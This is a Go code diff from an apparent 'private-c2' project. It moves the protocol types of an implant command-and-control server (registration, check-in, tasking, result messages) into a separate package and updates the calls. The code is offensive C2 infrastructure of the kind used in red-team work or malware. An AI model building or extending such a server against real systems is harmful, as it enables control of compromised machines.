@@ -9,58 +9,9 @@ import (
 	"time"
 
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
+	"github.com/azizbinmohammad/private-c2/pkg/protocol"
 	"github.com/google/uuid"
 )
-
-// Wire protocol message wrapper.
-type Message struct {
-	Type string          `json:"type"`
-	Data json.RawMessage `json:"data"`
-}
-
-// Registration payload sent by the implant.
-type RegisterData struct {
-	ImplantID string `json:"implant_id"`
-	Hostname  string `json:"hostname"`
-	Username  string `json:"username"`
-	OS        string `json:"os"`
-	Arch      string `json:"arch"`
-	PID       int    `json:"pid"`
-	Process   string `json:"process"`
-	Mode      string `json:"mode"`
-}
-
-// Registration acknowledgement sent to the implant.
-type RegisterAckData struct {
-	SessionID string `json:"session_id"`
-	Interval  int    `json:"interval"`
-}
-
-// Checkin payload (heartbeat/poll).
-type CheckinData struct {
-	SessionID string `json:"session_id"`
-}
-
-// Tasking response sent to implant.
-type TaskingData struct {
-	Tasks []TaskWire `json:"tasks"`
-}
-
-// TaskWire is the on-wire representation of a task.
-type TaskWire struct {
-	ID   string `json:"id"`
-	Type string `json:"type"`
-	Args string `json:"args"`
-}
-
-// Result payload from implant.
-type ResultData struct {
-	SessionID string `json:"session_id"`
-	TaskID    string `json:"task_id"`
-	Success   bool   `json:"success"`
-	Output    string `json:"output"`
-	Error     string `json:"error"`
-}
 
 // ImplantSession holds metadata about a connected implant.
 type ImplantSession struct {
@@ -129,7 +80,7 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 		return
 	}
 
-	var msg Message
+	var msg protocol.Message
 	if err := json.Unmarshal(frame, &msg); err != nil {
 		log.Printf("[c2] invalid JSON from %s: %v", remoteAddr, err)
 		return
@@ -140,7 +91,7 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 		return
 	}
 
-	var reg RegisterData
+	var reg protocol.RegisterData
 	if err := json.Unmarshal(msg.Data, &reg); err != nil {
 		log.Printf("[c2] invalid register data from %s: %v", remoteAddr, err)
 		return
@@ -172,7 +123,7 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 	log.Printf("[c2] new session %s from %s (%s@%s)", sessionID, remoteAddr, reg.Username, reg.Hostname)
 
 	// Send register_ack.
-	ack := RegisterAckData{SessionID: sessionID, Interval: 5000}
+	ack := protocol.RegisterAckData{SessionID: sessionID, Interval: 5000}
 	if err := s.sendMessage(conn, "register_ack", ack); err != nil {
 		log.Printf("[c2] failed to send register_ack to %s: %v", sessionID, err)
 		s.removeSession(sessionID)
@@ -187,7 +138,7 @@ func (s *ImplantServer) HandleConnection(conn net.Conn) {
 			break
 		}
 
-		var loopMsg Message
+		var loopMsg protocol.Message
 		if err := json.Unmarshal(frame, &loopMsg); err != nil {
 			log.Printf("[c2] session %s invalid JSON: %v", sessionID, err)
 			continue
@@ -220,19 +171,19 @@ func (s *ImplantServer) handleCheckin(conn net.Conn, sessionID string, data json
 	s.mu.Unlock()
 
 	// Build tasking response.
-	tasks := make([]TaskWire, 0, len(pending))
+	tasks := make([]protocol.TaskWire, 0, len(pending))
 	for _, t := range pending {
-		tasks = append(tasks, TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
+		tasks = append(tasks, protocol.TaskWire{ID: t.ID, Type: t.Type, Args: t.Args})
 	}
 
-	tasking := TaskingData{Tasks: tasks}
+	tasking := protocol.TaskingData{Tasks: tasks}
 	if err := s.sendMessage(conn, "tasking", tasking); err != nil {
 		log.Printf("[c2] session %s: failed to send tasking: %v", sessionID, err)
 	}
 }
 
 func (s *ImplantServer) handleResult(conn net.Conn, sessionID string, data json.RawMessage) {
-	var res ResultData
+	var res protocol.ResultData
 	if err := json.Unmarshal(data, &res); err != nil {
 		log.Printf("[c2] session %s: invalid result data: %v", sessionID, err)
 		return
@@ -265,7 +216,7 @@ func (s *ImplantServer) sendMessage(conn net.Conn, msgType string, data interfac
 		return fmt.Errorf("marshal data: %w", err)
 	}
 
-	msg := Message{Type: msgType, Data: json.RawMessage(dataBytes)}
+	msg := protocol.Message{Type: msgType, Data: json.RawMessage(dataBytes)}
 	frame, err := json.Marshal(msg)
 	if err != nil {
 		return fmt.Errorf("marshal message: %w", err)
